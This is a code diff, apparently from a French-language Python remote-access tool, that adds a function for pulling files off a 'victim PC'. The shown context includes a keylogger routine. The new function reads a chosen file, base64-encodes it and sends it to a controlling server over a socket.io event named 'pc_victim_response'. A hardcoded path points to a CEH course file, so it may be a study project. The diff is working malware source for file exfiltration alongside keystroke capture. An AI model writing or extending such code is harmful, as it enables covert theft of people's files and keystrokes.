@@ -1,5 +1,6 @@
 import base64
 import io
+import os
 import time
 import wave
 
@@ -80,3 +81,23 @@ def record_and_send_keyboard_log(duration=10, sio=None):
     except Exception as e:
         print(f"Échec de l'enregistrement du keylogger: {e}")
         pass
+
+
+#Télécharger des fichiers depuis le pc victime
+def download_file(file_path, sio):
+    try:
+        if not os.path.isfile(file_path):
+            raise Exception(f"Le fichier n'existe pas: {file_path}")
+
+        with open(file_path, 'rb') as file:
+            file_data = file.read()
+            file_encoded = base64.b64encode(file_data).decode()
+            sio.emit('pc_victim_response', {'file': file_encoded})
+            print("Fichier envoyé")
+    except Exception as e:
+        print(f"Échec de l'envoi du fichier: {e}")
+
+
+# Chemin à ajouter
+file_path = r'C:\Users\makad\OneDrive\Documents\CEH\Cours.pdf'
+
